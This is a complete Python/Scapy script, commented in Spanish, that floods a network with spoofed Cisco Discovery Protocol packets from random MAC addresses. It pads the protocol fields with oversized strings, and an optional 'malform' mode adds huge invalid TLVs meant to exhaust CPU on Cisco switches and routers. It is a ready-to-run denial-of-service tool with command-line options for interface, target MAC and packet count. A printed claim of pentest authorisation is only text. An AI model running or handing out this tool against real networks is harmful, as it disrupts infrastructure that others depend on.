#!/usr/bin/env python3
"""
CDP DoS Attack - OPTIMIZADO PARA SIMULACIÓN
USO: sudo python3 cdp_dos.py eth0 --packets 20000 --malform
"""
from scapy.all import *
from scapy.contrib.cdp import *
import random
import sys
import argparse
import time

def random_mac():
    return ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])

def random_cdp_device_id():
    devices = ["C2960", "C3750", "C6500", "N5K", "ASA5505", "Router", "AP"]
    return random.choice(devices) + str(random.randint(1000,9999)) + "Fake" * random.randint(1,5)  # Haz ID más variable/largo

def craft_cdp_packet(src_mac, malform=False):
    pkt = Ether(src=src_mac, dst="01:00:0c:cc:cc:cc") / \
          LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
          SNAP(OUI=0x0c, code=0x2000) / \
          CDPv2_HDR(ttl=random.randint(1,255)) / \
          CDPMsgDeviceID(val=random_cdp_device_id() + "A" * random.randint(50,200)) / \
          CDPMsgSoftwareVersion(val="Cisco IOS v15.0" + "X" * random.randint(100,500)) / \
          CDPMsgPlatform(val="Catalyst2960" + "Y" * random.randint(50,200)) / \
          CDPMsgCapabilities(cap=random.randint(0x00000001, 0xFFFFFFFF))

    if malform:
        # Añade múltiples TLVs inválidos y huge para DoS (causa high CPU en parsing)
        for _ in range(5):  # 5 TLVs extra
            pkt = pkt / CDPMsgGeneric(type=random.randint(0x0000, 0xFFFF), val="Z" * random.randint(1000,5000))

    return pkt

def cdp_dos(iface, target_mac=None, packets=1000, malform=False):
    print(f"💀 CDP DoS en {iface} - {packets} paquetes (malform: {malform})")
    print("🎯 Autorizado para pentest - Iniciando...")
   
    sent = 0
    try:
        while sent < packets:
            src_mac = random_mac()
            pkt = craft_cdp_packet(src_mac, malform)
           
            if target_mac:
                pkt[Ether].dst = target_mac
           
            sendp(pkt, iface=iface, verbose=0)
            sent += 1
            time.sleep(0.001)  # Más rápido para impacto en simulación
            
            if sent % 500 == 0:
                print(f"📊 Enviados: {sent}/{packets} ({sent/packets*100:.0f}%)")
               
    except KeyboardInterrupt:
        print(f"\n✅ Detenido. Total: {sent} paquetes enviados")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CDP DoS Attack")
    parser.add_argument("interface", nargs="?", default="eth0", help="Interfaz (ej: eth0)")
    parser.add_argument("--target-mac", help="MAC objetivo (opcional, default multicast)")
    parser.add_argument("--packets", type=int, default=10000, help="Paquetes (default: 10000)")
    parser.add_argument("--malform", action="store_true", help="Malformar paquetes para DoS más efectivo")
   
    args = parser.parse_args()
    print("=== CDP DoS PROFESSIONAL - OPTIMIZADO ===")
    cdp_dos(args.interface, args.target_mac, args.packets, args.malform)
